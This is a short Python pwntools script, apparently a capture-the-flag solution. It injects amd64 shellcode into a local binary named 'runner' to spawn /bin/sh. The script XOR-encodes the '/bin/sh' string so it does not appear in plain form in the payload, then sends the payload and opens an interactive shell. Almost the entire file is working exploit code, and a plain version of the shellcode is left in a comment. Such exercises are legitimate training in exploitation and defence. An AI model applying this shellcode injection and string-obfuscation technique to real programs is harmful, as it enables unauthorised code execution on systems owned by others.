# !/usr/bin/python3
from pwn import *


p = process("./runner")

context.arch = "amd64"

binsh = u64(b"/bin/sh\x00")
bish_encrypted = binsh ^ 0xFF_FF_FF_FF_FF_FF_FF_FF
print(f"Binsh is: {binsh}")
print(f"Encrypted BinSh is: {bish_encrypted}")
print(f"Decrypted string is: {bish_encrypted ^ 0xFF_FF_FF_FF_FF_FF_FF_FF}")


# Cannot LOAD DIRECT strings into RDI. NEED to load pointer
EXECVE = 0x3B

gdb_script = """
b *main
b *main+100
c
"""

# Push RSP always points to the recently pushed item in stack
# myShellCode = f"""
#     mov rbx, {binsh}
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 0x3b
#     push rbx
#     mov rdi, rsp
#     syscall
# """

myShellCode = f""" 
mov rax, {EXECVE}
xor rdx, rdx
xor rsi, rsi
mov rbx, {binsh}
push rbx
mov rdi, rsp
syscall
"""

myShellCode_Encrypted = f""" 
mov rax, {EXECVE}
xor rdx, rdx
xor rsi, rsi
mov rbx, {bish_encrypted}
xor rbx, 0xFFFFFFFFFFFFFFFF
push rbx
mov rdi, rsp
syscall
"""


payload = asm(myShellCode_Encrypted)
print(disasm(payload))
p.sendlineafter("that", payload)

# gdb.attach(p, gdbscript=gdb_script)


p.interactive()
